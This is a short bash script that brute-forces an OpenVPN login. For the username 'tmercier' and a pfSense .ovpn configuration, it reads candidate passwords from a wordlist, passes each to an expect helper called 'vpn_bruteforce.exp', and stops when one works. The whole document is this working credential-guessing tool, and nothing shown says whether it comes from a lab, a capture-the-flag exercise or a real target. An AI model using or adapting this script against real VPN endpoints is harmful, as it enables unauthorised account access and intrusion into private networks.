!/bin/bash

USERNAME="tmercier"
CONFIG="pfSense-UDP4-1194.ovpn"
PASSWORD_LIST="password.txt"

while IFS= read -r PASSWORD; do
    echo "Testing password: $PASSWORD"
    ./vpn_bruteforce.exp "$USERNAME" "$PASSWORD" "$CONFIG"
    if [ $? -eq 0 ]; then
        echo "Password found: $PASSWORD"
        exit 0
    fi
done < "$PASSWORD_LIST"

echo "No valid password found."